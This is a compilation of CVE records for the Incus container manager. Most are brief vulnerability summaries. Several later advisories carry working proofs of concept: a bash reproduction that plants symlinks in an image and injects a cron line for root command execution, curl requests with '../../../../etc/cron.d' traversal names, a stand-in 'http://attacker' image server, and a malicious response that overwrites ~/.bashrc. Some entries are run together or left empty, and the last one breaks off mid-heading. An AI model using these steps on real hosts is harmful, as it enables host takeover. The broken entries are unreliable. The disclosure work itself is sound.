CVE-2025-64507.description: Incus is a system container and virtual machine manager. An issue in versions prior to 6.0.6 and 6.19.0 affects any Incus user in an environment where an unprivileged user may have root access to a container with an attached custom storage volume that has the `security.shifted` property set to `true` as well as access to the host as an unprivileged user. The most common case for this would be systems using `incus-user` with the less privileged `incus` group to provide unprivileged users with an isolated restricted access to Incus. Such users may be able to create a custom storage volume with the necessary property (depending on kernel and filesystem support) and can then write a setuid binary from within the container which can be executed as an unprivileged user on the host to gain root privileges. A patch for this issue is expected in versions 6.0.6 and 6.19.0. As a workaround, permissions can be manually restricted until a patched version of Incus is deployed.

CVE-2026-23953.description:
Incus is a system container and virtual machine manager. In versions 6.20.0 and below, a user with the ability to launch a container with a custom YAML configuration (e.g a member of the ‘incus’ group) can create an environment variable containing newlines, which can be used to add additional configuration items in the container’s lxc.conf due to newline injection. This can allow adding arbitrary lifecycle hooks, ultimately resulting in arbitrary command execution on the host. Exploiting this issue on IncusOS requires a slight modification of the payload to change to a different writable directory for the validation step (e.g /tmp). This can be confirmed with a second container with /tmp mounted from the host (A privileged action for validation only). A fix is planned for versions 6.0.6
and 6.21.0, but they have not been released at the time of publication.

CVE-2026-23954.title: Incus is a system container and virtual machine manager. Versions ...
CVE-2026-23954.description: Incus is a system container and virtual machine manager. Versions 6.21.0 and below allow a user with the ability to launch a container with a custom image (e.g a member of the ‘incus’ group) to use directory traversal or symbolic links in the templating functionality to achieve host arbitrary file read, and host arbitrary file write. This ultimately results in arbitrary command execution on the host. When using an image with a metadata.yaml containing templates, both the source and target paths are not checked for symbolic links or directory traversal. This can also be exploited in IncusOS. A fix is planned for versions 6.0.6 and 6.21.0, but they have not been released at the time of publication.

CVE-2026-33711.title: Incus is a system container and virtual machine manager. Incus pr ...
CVE-2026-33711.description: Incus is a system container and virtual machine manager. Incus provides an API to retrieve VM screenshots. That API relies on the use of a temporary file for QEMU to write the screenshot to which is then picked up and sent to the user prior to deletion. As versions prior to 6.23.0 use predictable paths under /tmp for this, an attacker with local access to the system can abuse this mechanism by creating their own symlinks ahead of time. On the vast majority of Linux systems, this will result in a "Permission denied" error when requesting a screenshot. That's because the Linux kernel has a security feature designed to block such attacks, `protected_symlinks`. On the rare systems with this purposefully disabled, it's then possible to trick Incus intro truncating and altering the mode and permissions of arbitrary files on the filesystem, leading to a potential denial of service or possible local privilege escalation. Version 6.23.0 fixes the issue.

CVE-2026-33743.title: Incus is a system container and virtual machine manager. Prior to ...
CVE-2026-33743.description: Incus is a system container and virtual machine manager. Repeated use of this attack can be used to keep the server offline causing a denial of service of the control plane API. This does not impact any running workload, existing containers and virtual machines will keep operating. Version 6.23.0 fixes the issue.

CVE-2026-33897.title: Incus is a system container and virtual machine manager. Prior to ...
CVE-2026-33897.description: Incus is a system container and virtual machine manager. Prior to version 6.23.0, instance template files can be used to cause arbitrary read or writes as root on the host server. Incus allows for pongo2 templates within instances which can be used at various times in the instance lifecycle to template files inside of the instance. This particular implementation of pongo2 within Incus allowed for file read/write but with the expectation that the pongo2 chroot feature would isolate all such access to the instance's filesystem. This was allowed such that a template could theoretically read a file and then generate a new version of said file. Unfortunately the chroot isolation mechanism is entirely skipped by pongo2 leading to easy access to the entire system's filesystem with root privileges. Version 6.23.0 patches the issue.

CVE-2026-33945.title: Incus is a system container and virtual machine manager. Incus in ...
CVE-2026-33945.description: Incus is a system container and virtual machine manager. Incus instances have an option to provide credentials to systemd in the guest. For containers, this is handled through a shared directory. Prior to version 6.23.0, an attacker can set a configuration key named something like `systemd.credential.../../../../../../root/.bashrc` to cause Incus to write outside of the `credentials` directory associated with the container. This makes use of the fact that the Incus syntax for such credentials is `systemd.credential.XYZ` where `XYZ` can itself contain more periods. While it's not possible to read any data this way, it's possible to write to arbitrary files as root, enabling both privilege escalation and denial of service attacks. Version 6.23.0 fixes the issue.

CVE-2026-35527.title: Incus is an open source container and virtual machine manager. In ...
CVE-2026-35527.description:
Incus is an open source container and virtual machine manager. In versions prior to 7.0.0, the image import flow issues an outbound HEAD request to a user-supplied URL before validating the request against project restrictions such as restricted.images.servers. The imgPostURLInfo function constructs and sends a HEAD request directly from the attacker-supplied source URL to resolve image metadata, and this network interaction occurs before the flow reaches the point where the import would be rejected by policy. Although the actual image download is blocked by the project restriction, an authenticated user can coerce the daemon into making blind HEAD requests to arbitrary destinations.

These requests include server metadata in custom headers (Incus-Server-Architectures, Incus-Server-Version), which discloses information about the host environment to the attacker-controlled endpoint. This blind SSRF primitive can be used to probe internal services, unroutable address space, or cloud metadata endpoints reachable from the host.

This vulnerability pattern is similar to CVE-2026-24767. This issue has been fixed in version 7.0.0.

CVE-2026-40195.title: Incus is a system container and virtual machine manager. In versi ...
CVE-2026-40195.description: Incus is a system container and virtual machine manager. In versions before 7.0.0, missing validation logic in the storage bucket import logic allows an authenticated user with access to the storage bucket feature to cause the Incus daemon to crash. The vulnerability is present in the backup metadata handling logic, where the daemon processes the index.yaml file from an imported archive and accesses members of the parsed backup configuration without first verifying that the configuration object was initialized. A malicious or malformed index.yaml that omits the config block causes a nil-pointer dereference during bucket import operations and terminates the daemon. Repeated use of this issue can be used to keep Incus offline, causing a denial of service. This issue is fixed in version 7.0.0.

CVE-2026-40197.title: Incus is a system container and virtual machine manager. In versi ...
CVE-2026-40197.description: Incus is a system container and virtual machine manager. In versions before 7.0.0, missing validation logic in the storage volume import logic allows an authenticated user with access to the storage volume feature to cause the Incus daemon to crash. The custom volume backup import subsystem contains a nil-pointer dereference vulnerability during import operations. In the snapshot import loop, the daemon iterates over entries from `srcBackup.Config.VolumeSnapshots` and assumes that each slice element is initialized, then dereferences fields such as `Name`, `Config`, `Description`, `CreatedAt`, and `ExpiresAt` without first validating the element itself. Because the yaml unmarshaler accepts explicit null array elements from an attacker-controlled index.yaml and converts them into nil pointers inside the slice, an attacker can supply a backup archive containing a null entry in the volume_snapshots array. This causes a nil-pointer dereference during custom volume import and terminates the daemon, resulting in denial of service on the affected node. Repeated use of this issue can be used to keep Incus offline, causing a denial of service. This issue is fixed in version 7.0.0.

CVE-2026-40243.title: Incus is a system container and virtual machine manager. In versi ...
CVE-2026-40243.description:
Incus is a system container and virtual machine manager. In versions before 7.0.0, broken TLS validation logic in the OVN database connection logic can allow connections to an attacker's OVN database. The OVN client implementations disable Go standard TLS server verification and replace it with custom peer-certificate verification logic. That replacement verifier does not anchor trust in the configured CA certificate. Instead, it constructs the verification root set from certificates supplied by the peer during the handshake, so the configured CA is parsed but not used as the trust anchor for the final verification decision.

In OVN-enabled deployments that use these SSL database connection paths, an attacker able to impersonate or intercept the OVN endpoint on the management network can present a rogue self-signed certificate chain, and Incus will accept this certificate as valid. This issue defeats the intended CA-based trust model for OVN database connections and permits endpoint impersonation by an active attacker in a suitable network position. This issue is fixed in version 7.0.0.

CVE-2026-40251.title: Incus is a system container and virtual machine manager. In versi ...
CVE-2026-40251.description:
Incus is a system container and virtual machine manager. In versions before 7.0.0, missing validation logic in the storage volume import logic allows an authenticated user with access to the storage volume feature to cause the Incus daemon to crash. The backup restore subsystem contains an out-of-bounds panic vulnerability caused by an invalid bounds check when indexing snapshot metadata arrays, and the same flawed pattern also appears in the migration path. When iterating through physical snapshots provided in a backup archive, the loop uses the index to look up corresponding metadata in the parsed `Config.Snapshots` and `Config.VolumeSnapshots` slices. The guard condition `len(slice) >= i-1` is incorrect because it can still evaluate to true when the subsequent slice[i] access is out of bounds.

An attacker can submit a backup archive that contains physical snapshot directories while supplying a tampered `index.yaml` with an empty or truncated snapshot metadata array, causing the daemon to index beyond the end of the metadata slice and crash. Repeated use of this issue can be used to keep Incus offline, causing a denial of service. This issue is fixed in version 7.0.0.

CVE-2026-41647.description: Incus is a system container and virtual machine manager. CVE-2026-41648.description: Incus is a system container and virtual machine manager. This was making it easy for an authenticated user to provide a crafted image or backup tarball that when parsed by Incus would lead to a very large YAML document being loaded into memory, potentially causing the entire server to run out of memory. CVE-2026-41684.title: Incus is a system container and virtual machine manager. Prior to ...
CVE-2026-41684.description: Incus is a system container and virtual machine manager. Prior to version 7.0.0, backup.GetInfo() trusts the inline backup/index.yaml config when present and only falls back to parsing the legacy backup/container/backup.yaml file if result.Config == nil. As a result, an archive can carry a valid inline config that passes the initial import preflight while also carrying a malformed legacy backup/container/backup.yaml file that is reparsed later from the restored file system. ParseConfigYamlFile() accepts YAML documents with no container section, and multiple downstream consumers then dereference. Container without checking for nil. Confirmed examples in the instance restore and import flow include backup.UpdateInstanceConfig() and internalImportFromBackup(). An authenticated user with permission to import instance backups may be able to crash the Incus daemon with a crafted backup archive whose inline backup/index.yaml is valid but whose extracted legacy backup.yaml omits container. The crash occurs in the restore path after archive extraction has begun. This issue has been patched in version 7.0.0.

CVE-2026-41685.title: Incus is a system container and virtual machine manager. Prior to ...
CVE-2026-41685.description: Incus is a system container and virtual machine manager. CVE-2026-62313.title: Incus is a system container and virtual machine manager. Prior to ...
CVE-2026-62313.description: Incus is a system container and virtual machine manager. CVE-2026-81493.title: Arbitrary file write on host via image fingerprint path traversal
CVE-2026-81493.description: ## Summary The fix for CVE-2026-48769 (GHSA-f6m5-xw2g-xc4x, commit `46d6ef23`, present in v7.2.0) added `validate.IsSHA256(fp)` but gated it to `protocol == 'direct'` only. A project user with `EntitlementCanCreateImages` can `POST /1.0/images` with `source.protocol=simplestreams` (or `incus`/`lxd`/`oci`), `source.secret=<any>`, and `source.fingerprint=../../../../etc/cron.d/x`. Because the secret path skips the fingerprint reassignment, the raw attacker value reaches `os.Create` at `daemon_images.go:393` as the root daemon — an unconditional arbitrary file create/truncate; pairing with an attacker-run `source.server` fills it with attacker content → host RCE. ## Root Cause `imgPostRemoteInfo` (`images.go:532`) maps the request body `Fingerprint`→`Alias`, plus `Protocol`, `Secret`, `Server`. `fp := args.Alias` (`daemon_images.go:93`) is the attacker fingerprint. The block at `daemon_images.go:135-161` that would reassign `fp = info.Fingerprint` is gated by `if args.Secret == ''` — so with a secret set it is skipped and `fp` stays the raw traversal string. The validation `if protocol == 'direct' { validate.IsSHA256(fp) }` (`daemon_images.go:350`) does not run for `simplestreams`/`incus`/`lxd`/`oci`. `destName := filepath.Join(destDir, fp)` (`:358`) then, in the `{incus,lxd,oci,simplestreams}` branch, `dest, _ := os.Create(destName)` (`:393`) — executing BEFORE the `fp = info.Fingerprint` reassignment at `:416`. `GetPrivateImageFile(fp, secret, request)` streams the attacker server's bytes into the created file. ## Impact Unconditional arbitrary-file create/truncate on any root-writable host path (integrity/DoS); with a malicious `source.server`, arbitrary-content write → host root RCE (e.g. `/etc/cron.d/`). The failure-path `os.Remove(destName)` also gives an arbitrary-path unlink primitive. ## Proof of Concept As a project user with `EntitlementCanCreateImages`: `POST /1.0/images` with body `source.type=image`, `source.protocol=simplestreams`, `source.server=http://attacker`, `source.secret=x`, `source.fingerprint=../../../../etc/cron.d/x`. Incus creates/truncates `/var/lib/incus/images/../../../../etc/cron.d/x` and streams the attacker server's content into it. ## Attack Chain 1. Entry: `POST /1.0/images` (auth `EntitlementCanCreateImages`, images.go:1159) → `imgPostRemoteInfo` (images.go:532) maps body into `imageDownloadArgs`. 2. fp init: `fp := args.Alias` = attacker fingerprint (daemon_images.go:93). 3. Alias resolution skipped: the `fp = info.Fingerprint` reassignment (daemon_images.go:135-161) is gated by `if args.Secret == ''`; with a secret set it is skipped → `fp` stays the raw traversal string. 4. Check: `if protocol == 'direct' { validate.IsSHA256(fp) }` (daemon_images.go:350) — does NOT run for simplestreams/incus/lxd/oci. Bypass proof: `git show 46d6ef23` adds exactly `if protocol == 'direct' { ... IsSHA256 ... }`; no validation for other protocols. 5. Sink: `destName := filepath.Join(VarPath('images'), fp)` (:358) → `dest, _ := os.Create(destName)` (:393) executes before `fp = info.Fingerprint` (:416). Root daemon creates/truncates `/var/lib/incus/images/../../../../etc/cron.d/x`. `GetPrivateImageFile(fp, secret, request)` (:452) streams attacker bytes. 6. Impact: arbitrary-file truncate on any root-writable path; malicious `source.server` → arbitrary-content write → host RCE. ## Bypass Evidence `git show 46d6ef23` confirms the fix gates `validate.IsSHA256(fp)` behind `protocol == 'direct'` only. `grep -n` confirms `args.Secret == ''` at :135 gating the reassignment at :160, and `os.Create(destName)` at :393 preceding the reassignment at :416. Incomplete-fix bypass — affected range is the CVE-2026-48769 fix version onward through HEAD. ## Affected Versions `<= 7.2.0` (fix commit 46d6ef23 IS contained in v7.2.0, so the bypass affects the released version; vulnerable code verified present on HEAD 60d85b3e). ## Suggested Fix Hoist `validate.IsSHA256(fp)` to run for ALL protocols before `filepath.Join`/`os.Create`, and re-validate after any `fp = info.Fingerprint` reassignment. ## Credit Vulnerability independently discovered and responsibly disclosed by Zhixi 'Jace' Sun (@manus-use).

CVE-2026-81494.title: Arbitrary file write on host via image-planted symlinks and oci.dns.* newline injection
CVE-2026-81494.description:
## Summary Incus extracts a unified image's top-level files straight into the instance directory, and later writes to two of those paths as root without checking for symlinks: `backup.yaml` (at instance create) and `network/resolv.conf` (at OCI container start). An imported image can ship those names as absolute symlinks pointing anywhere on the host. When the instance is created and started, `incusd` follows them and writes root-owned files outside the instance directory. Because `oci.dns.domain` and `oci.dns.search` accept newlines, the content written to `resolv.conf` is attacker-controlled. Pointing that symlink at `/etc/cron.d/` turns the write into root command execution. This is reachable by importing a crafted image (`incus image import`), not by pulling one from an OCI/Docker registry - the registry path rebuilds the metadata tarball from only `config.json` and `metadata.yaml`, so it can't carry these entries. ## Who can do this The relevant boundary is the project-scoped (restricted) certificate, which Incus treats as an 'operator (`internal/server/auth/driver_tls.go:83-94`, role assigned at `:242`). Such a user has full rights inside their own project - including importing images and creating/starting instances - but is not a server admin and is confined to their project. This bug lets that operator write files as root on the host, escaping the project. It does not add any privilege in the default single-admin setup (local socket, one unrestricted cert), where an image importer is already root-equivalent. The `PR:L` score assumes the restricted/multi-tenant model. ## Root cause 1. Image top-level content is unpacked into the instance directory and never sanitized. `getImageMetadata()` (`cmd/incusd/images.go`) only checks that `metadata.yaml` and a `rootfs/` entry exist; it doesn't reject extra entries like `network/` or `backup.yaml`. `ImageUnpack()` (`internal/server/storage/utils.go`) only `Lstat`s `rootfs` for a symlink. On the dir backend the whole tarball goes straight into the instance volume. 2. Two root writes under the instance dir use plain `os.WriteFile`/`os.Create`, which follow symlinks. The sibling `templates` and `credentials` writes in the same driver were already moved to `os.OpenRoot`; these two were not. | Path | Location (7.2.0 → main) | Written at | Instance types | |---|---|---|---| | `network/resolv.conf` | `driver_lxc.go:2635` → `:2644` | OCI start | OCI containers | | `backup.yaml` | `backend.go:6967` → `:7042` | instance create | all containers + VMs | 3. `oci.dns.domain` / `oci.dns.search` use `validate.IsAny` (`internal/instance/config.go:816/825`, `:830/839` on main), so newlines pass. `resolv.conf` is built with `fmt.Fprintf(&resolvConf, 'domain %s
', value)`, so a newline in the value adds a second, fully controlled line. `backup.yaml` is the broader of the two: it needs no `config.json` or `oci.*` config, fires on create for every instance type, and isn't fixed by hardening only the `network/` writes. ## Call path Create → `instanceCreateFromImage()` (`instance.go:137`) → `CreateInstanceFromImage()` (`backend.go:1824`) unpacks the image into the instance dir (planting the symlinks), then `UpdateBackupFile()` (`instance.go:273`) → `os.Create(inst.Path()/backup.yaml)` (`backend.go:7042`) follows the symlink. Start → config generation checks `PathExists(d.Path()/config.json)` (`driver_lxc.go:2426`), then `os.WriteFile(d.Path()/network/resolv.conf, …)` (`:2644`) follows the symlink. ## What I tested Incus 7.2 (client and server), dir storage backend, `incus admin init --minimal`, Ubuntu 24.04. One crafted image with both symlinks. - `incus init` wrote the `backup.yaml` symlink target as `root:root`, mode 0400, outside the instance dir, containing the instance's backup YAML. No start needed. - `incus start` wrote the `resolv.conf` symlink target as `root:root`, mode 0644. The nested container start then failed under Docker (`forklxc`), but the write happens during config generation before that, so it lands regardless. On a full VM the start also completes. - Root command execution via `/etc/cron.d`: this needs one detail. A value like `x
* * * * * root <cmd>` writes `domain x` as the first line, which cron 3.0pl1 (Debian/Ubuntu) treats as a syntax error and drops the whole file - nothing runs. Prefixing the value with `=` (so the line becomes `domain =x`) makes cron read it as an environment assignment (`domain=x`), the file is accepted, and the next line runs. With that, cron executed the injected command as root; the proof file contained `uid=0(root) gid=0(root) groups=0(root)`. The arbitrary root write itself needs no cron and no other component. Code execution needs a host-side consumer of the file - cron is the one I demonstrated (present by default on most server distros), and needs the `=` trick above. Other consumers (`~root/.ssh/authorized_keys`, `/etc/ld.so.preload`) have their own preconditions. ## Reproduction Tested on a disposable host with Incus 7.2.0 and a dir storage pool (`incus admin init --minimal`). Everything below runs as an ordinary Incus user against their own project; the files that get written are owned by root. ### 1. Build the crafted image The same image carries both symlinks. `backup.yaml` is aimed at a harmless `/tmp` marker (proves the write); `network/resolv.conf` is aimed at `/etc/cron.d` (proves code execution). Point both at `/tmp` if you only want the write proof. ```bash mkdir -p img/rootfs img/network cat > img/metadata.yaml <<'EOF' architecture: x86_64 creation_date: 1 properties: type: oci EOF # minimal but valid OCI runtime spec; process.args is dereferenced before the resolv.conf write printf '{'ociVersion':'1.0.2','process':{'user':{'uid':0,'gid':0},'args':['/bin/sh'],'cwd':'/'},'root':{'path':'rootfs'}}' > img/config.json ln -s /tmp/incus-write-proof img/backup.yaml # write target (create) ln -s /etc/cron.d/incus-rce img/network/resolv.conf # RCE target (start) tar --owner=0 --group=0 --numeric-owner -C img -cf image.tar \ metadata.yaml rootfs config.json network backup.yaml tar -tf image.tar # confirms the two entries are symlinks ``` ### 2. Arbitrary root write - `backup.yaml`, fires at create ```bash incus image import image.tar --alias evil incus init evil victim stat -c '%n %U:%G %a' /tmp/incus-write-proof ``` Expected: the file exists outside any instance directory, owned by root: ``` /tmp/incus-write-proof root:root 400 ``` `/tmp/incus-write-proof` now holds the instance's backup YAML - proof that `os.Create(inst.Path()/backup.yaml)` followed the symlink. This alone is the arbitrary-write primitive and needs no container start. ### 3. Root command execution - `resolv.conf` into `/etc/cron.d` The injected value must start with `=` so the first line becomes `domain =x`, which cron reads as an environment assignment; without it, the leading `domain x` line is a cron syntax error and Debian/Ubuntu cron drops the whole file. ```bash incus config set victim oci.dns.domain '$(printf '=x
* * * * * root id > /tmp/rce 2>&1')' incus start victim # writes /etc/cron.d/incus-rce via the symlink (start itself may error afterwards) cat /etc/cron.d/incus-rce ``` Expected file (root:root, 0644): ``` domain =x * * * * * root id > /tmp/rce 2>&1 ``` Within a minute cron runs it as root: ```bash sleep 65; cat /tmp/rce # uid=0(root) gid=0(root) groups=0(root) ``` ### Cleanup ```bash incus delete -f victim; incus image delete evil rm -f /tmp/incus-write-proof /tmp/rce /etc/cron.d/incus-rce ``` ## Impact Arbitrary create/truncate of any root-writable file on the host (I:H/A:H): truncate `/etc/shadow`, overwrite a systemd unit, corrupt `incusd` state. Root command execution (C:H/I:H/A:H) when the write lands in a file a root process reads, as shown with cron. The write is in the host mount namespace and isn't limited by the container's user namespace or privilege level. ## Fix 1. Do the writes under the instance dir through `os.OpenRoot` (already used for templates and credentials): `backup.yaml`, `network/resolv.conf`, `network/hosts`, `network/hostname`, `network/dhcp.skip`. 2. After unpack, reject or remove daemon-owned top-level entries (`network/`, `backup.yaml`, `config.json`, `credentials/`, `state/`, …) instead of trusting the image; extend the existing `rootfs` symlink check to them. 3. Reject ``/`
` in `oci.dns.domain` and each `oci.dns.search` element.

CVE-2026-81495.title: Arbitrary file write on host via path traversal in custom volume import
CVE-2026-81495.description: ## Summary `POST /1.0/storage-pools/<pool>/volumes` with an `application/octet-stream` body (custom-volume ISO or backup import) uses an attacker-controlled name as an on-disk path segment without validation. A project user with the `can_create_storage_volumes` entitlement can supply `X-Incus-name: ../../../../<target>` (ISO) or an `index.yaml name: ../../../../<target>` (backup), causing the root Incus daemon to create directories, remove directory trees (`os.RemoveAll`), and (backup vector) unpack attacker content outside the storage pool. The `validate.IsAPIName` guard exists only on the JSON create branch and is never reached on the import branches. ## Root Cause In `storagePoolVolumesPost` (`cmd/incusd/storage_volumes.go:828-833`), octet-stream requests dispatch to `createStoragePoolVolumeFromISO(..., r.Header.Get('X-Incus-name'))` (`:830`) or `createStoragePoolVolumeFromBackup(...)` (`:833`) BEFORE the `validate.IsAPIName(req.Name)` at `:845` (which is only on the JSON branch). `createStoragePoolVolumeFromISO` (`:2697`) checks only `volName == ''` (`:2701`). The name flows to `pool.CreateCustomVolumeFromISO(projectName, volName, ...)` -> `project.StorageVolume(projectName, volName)` -> `GetVolume(...).MountPath()` -> `dir.CreateVolume` `EnsureMountPath` `os.Mkdir` + reverter `os.RemoveAll(volPath)`. `VolumeDBCreate`/`validateVolume` validate config keys only, not the name (verified - no `ValidName`/`IsAPIName`/`filepath` check in either). ## Impact Root-owned arbitrary directory creation and directory-tree removal (`os.RemoveAll`) at an attacker-chosen path (integrity/DoS). The backup import vector additionally unpacks tarball rootfs bytes, giving arbitrary-content file write as root -> host RCE. ## Proof of Concept ISO: `curl -X POST --data-binary @x.iso -H 'Content-Type: application/octet-stream' -H 'X-Incus-type: iso' -H 'X-Incus-name: ../../../../etc/cron.d/pwn' https://incus/1.0/storage-pools/default/volumes` (as a user with `can_create_storage_volumes`). ## Attack Chain 1. Entry: `POST /1.0/storage-pools/<pool>/volumes`, `Content-Type: application/octet-stream`, `X-Incus-type: iso`, `X-Incus-name: ../../../../etc/cron.d/x` -> `createStoragePoolVolumeFromISO` (`storage_volumes.go:830`). Guard: `allowPermission(project, can_create_storage_volumes)`. 2. Check: `if volName == ''` (`:2701`) - rejects only empty. `validate.IsAPIName(req.Name)` (`:845`) is on the JSON branch, not reached. Bypass proof: `volName` passes with any value including the traversal string. 3. Sink: `pool.CreateCustomVolumeFromISO(projectName, volName, ...)` (`backend.go`) -> `project.StorageVolume(proj, volName)` -> `GetVolume(...).MountPath()` -> `EnsureMountPath` `os.Mkdir` + reverter `os.RemoveAll(volPath)`, as root. `VolumeDBCreate`->`validateVolume` validates config keys only (verified). 4. Impact: root arbitrary dir create + directory-tree removal at attacker path; backup vector adds arbitrary-content write (RCE). ## Bypass Evidence `validate.IsAPIName` present but on the wrong branch (`:845`, JSON only); import branches (`:830`/`:833`) bypass it; downstream validation is config-only. `filepath.Join` collapse verified (same as the instance backup-import path). Forced `.iso` suffix constrains the final filename but still permits arbitrary-directory creation/removal via `..`. ## Affected Versions `<= 7.2.0` (vulnerable code verified present on latest release tag v7.2.0 and on HEAD 60d85b3e; no fix commit on `cmd/incusd/storage_volumes.go` between v7.2.0 and HEAD). ## Suggested Fix Apply `validate.IsAPIName(volName, false)` to the `X-Incus-name` header and to `bInfo.Name`/each volume-snapshot name at handler entry, before any storage I/O. ## Credit Vulnerability independently discovered and responsibly disclosed by Zhixi 'Jace' Sun (@manus-use).

CVE-2026-81496.title: Arbitrary file write on host via path traversal in instance backup import
CVE-2026-81496.description: ## Summary `POST /1.0/instances` with an `application/octet-stream` body (instance backup import) reads the instance name from the tarball's `backup/index.yaml` verbatim and uses it as an on-disk path segment. A project user with the `can_create_instances` entitlement can set `name: ../../../../etc/cron.d/x`, causing the root Incus daemon to create a directory and unpack attacker-controlled tarball content outside the storage pool - before any name validation runs. This yields arbitrary directory creation and arbitrary-content file write as root, and thus host RCE. ## Root Cause In `createFromBackup` (`cmd/incusd/instances_post.go`), the tarball metadata is parsed by `backup.GetInfo` (`internal/server/backup/backup_info.go:64-160`), which loads `result.Name` straight from `index.yaml` via YAML unmarshal with NO validation - no `filepath.Clean`, no `IsAPIName`, no `/` or `..` rejection. The name then flows to `pool.CreateInstanceFromBackup` -> `project.Instance(srcBackup.Project, srcBackup.Name)` (`internal/server/storage/backend.go:744`) -> `vol.MountPath()` -> `GetVolumeMountPath` = `VarPath('storage-pools', pool, 'containers', <name>)` -> `EnsureMountPath` `os.Mkdir` + `CreateVolumeFromBackup` content unpack. `instance.ValidName` exists only at `instances_post.go:1452`, which is on the JSON-dispatch path and is never reached for the octet-stream branch (dispatch returns at `:1157`). ## Impact Root-owned arbitrary directory creation and arbitrary-content file write outside the storage pool (e.g. `/etc/cron.d/`), leading to host remote code execution. Snapshot names (`bInfo.Snapshots[]`) are a second identical vector. ## Proof of Concept 1. Build an instance backup tarball whose `backup/index.yaml` sets `name: ../../../../etc/cron.d/pwn` and whose `container/rootfs` contains a crafted cron file body. 2. `curl -X POST --data-binary @backup.tar -H 'Content-Type: application/octet-stream' https://incus/1.0/instances` (as a user with `can_create_instances`). 3. The daemon writes attacker content to `/etc/cron.d/pwn` as root. ## Attack Chain 1. Entry: `POST /1.0/instances`, `Content-Type: application/octet-stream`, no `X-Incus-name`. Guard: none for this branch -> `createFromBackup` (`instances_post.go:1157`). 2. Parse: `bInfo, _ := backup.GetInfo(backupFile, ...)` (`instances_post.go:851`) reads `Name` from `index.yaml`. Guard: `GetInfo` (`backup_info.go:64-160`) - none. Bypass proof: field returned untouched from YAML unmarshal; no `Clean`/`IsAPIName`/`..` check in the function (verified at HEAD). 3. Restriction check: `AllowInstanceCreation` (`instances_post.go:871`) validates project restrictions only, not name syntax. Passes. 4. Sink: `pool.CreateInstanceFromBackup(*bInfo, ...)` (`instances_post.go:992`) -> `project.Instance(proj, bInfo.Name)` (`backend.go:744`) -> `vol.MountPath()` -> `EnsureMountPath` `os.Mkdir` (`internal/server/storage/drivers/volume.go`) + content unpack, as root, BEFORE `internalImportFromBackup` and BEFORE the unreachable `ValidName` at `:1452`. 5. Impact: root arbitrary dir create + attacker-content file write -> host RCE. ## Bypass Evidence No guard exists between the tarball name and the disk write. Go's `filepath.Join` collapses `..`: `filepath.Join('/var/lib/incus/storage-pools/p/containers','../../../../etc/cron.d/x')` = `/var/lib/etc/cron.d/x` (verified by running it; deeper `..` reaches `/etc/cron.d/x`). Same class as CVE-2026-48753 but a distinct, unfixed entry point (record name used as path segment, not a symlink inside the archive payload). ## Affected Versions `<= 7.2.0` (vulnerable code verified present on latest release tag v7.2.0 and on HEAD 60d85b3e; no fix commit on `cmd/incusd/instances_post.go` between v7.2.0 and HEAD). ## Suggested Fix Apply `instance.ValidName(bInfo.Name, false)` (and validate each snapshot name) immediately after `backup.GetInfo`, before any storage I/O. ## Credit Vulnerability independently discovered and responsibly disclosed by Zhixi 'Jace' Sun (@manus-use).

CVE-2026-81500.title: Incus CLI path traversal when exporting an image from a malicious server
CVE-2026-81500.description: ## Summary The `incus` CLI, when exporting or copying an image from a remote server into a directory target, takes the local filename verbatim from the server-controlled `Content-Disposition: filename=` for UNIFIED images and passes it into `os.Rename(tmp, filepath.Join(target, resp.MetaName))` with no `filepath.Base` / traversal check. A malicious or MITM'd image server that the user points the CLI at can therefore write the downloaded (attacker-controlled) image bytes to an arbitrary path on the client, escaping the export directory — e.g. overwrite `~/.bashrc` → code execution on the client's next shell. ## Root Cause On the unified-image branch (`client/incus_images.go:339`, forced by the server not sending a `multipart/form-data` Content-Type), `mime.ParseMediaType(Content-Disposition)` yields `filename = cdParams['filename']` and `resp.MetaName = filename` is stored verbatim at `client/incus_images.go:356` with NO `filepath.Base`. It then reaches `os.Rename(targetMeta, filepath.Join(target, resp.MetaName))` at `cmd/incus/image.go:641`. The multipart/split branch is SAFE because it uses `multipart.Part.FileName()`, which basenames the value. The hash guard `if imageType != 'oci' && !strings.HasPrefix(hash, fingerprint)` at `client/incus_images.go:360` is bypassable: (a) the server sets response header `X-Incus-Type: oci` (`:254`) → check skipped entirely; or (b) when the user passes an alias, `fingerprint` is itself server-controlled via `dereferenceAlias`→`GetImageAliasType().Target` (`image.go:133-142`), so the attacker sets it to `sha256(malicious_bytes)` and `HasPrefix` passes. ## Impact Arbitrary file overwrite on the client as the invoking user → code execution (shell rc, cron, SSH config). The attacker is a remote/MITM'd image server; the victim must run `incus image export`/`copy` into a directory target from that remote. Pointing the CLI at public/untrusted image servers is a normal Incus workflow. ## Proof of Concept ``` # Malicious image server. Victim runs: incus image export evil:someimg ~/Downloads/ # Server responds to the /export request with: # HTTP/1.1 200 OK # X-Incus-Type: oci # bypass (a): skips hash check # Content-Type: application/octet-stream # forces unified branch (not multipart) # Content-Disposition: attachment; filename='../../../../home/victim/.bashrc' # <attacker payload bytes> # Client: resp.MetaName = '../../../../home/victim/.bashrc' (no filepath.Base) # os.Rename(tmp, filepath.Join('~/Downloads', resp.MetaName)) -> overwrites ~/.bashrc # -> code execution as victim on next interactive shell. ``` ## Attack Chain 1. **Entry:** victim runs `incus image export evil:x ~/Downloads/` (directory target). `IsDir(target)` true → `cmd/incus/image.go:569-575`, `606` `GetImageFile`, `639-641` rename branch. - **Guard:** none on the server-provided name. 2. **Branch force:** attacker server responds with a non-`multipart/form-data` Content-Type → unified branch `client/incus_images.go:339` (multipart branch `:286` skipped). - **Guard:** branch selection. **Bypass proof:** attacker controls Content-Type. 3. **Tainted name:** `mime.ParseMediaType(Content-Disposition)` → `resp.MetaName = filename` at `client/incus_images.go:356`, NO `filepath.Base`. - **Guard:** `mime.ParseMediaType` filename param. **Bypass proof:** `go run` confirmed it returns `../../../../home/victim/.bashrc` verbatim, unlike `part.FileName()` (basenames to `evil`) in the multipart branch (`:310`). 4. **Hash guard:** `client/incus_images.go:360` `if imageType != 'oci' && !strings.HasPrefix(hash, fingerprint)`. - **Bypass proof (a):** response header `X-Incus-Type: oci` (`:254`) → check skipped (source-verified). **(b):** alias-derived `fingerprint` = `GetImageAliasType().Target` is server-controlled (`image.go:133-142`) → attacker sets `sha256(malicious)`; `HasPrefix` passes (source-verified). 5. **Sink:** `os.Rename(targetMeta, filepath.Join('~/Downloads', '../../../../home/victim/.bashrc'))` at `cmd/incus/image.go:641` → writes attacker bytes to `~/.bashrc`. - **Bypass proof:** `go run` confirmed `os.Rename` across the collapsed `../` escaped the dir and overwrote the target. 6. **Impact:** arbitrary file overwrite on the client as the invoking user → RCE. ## Bypass 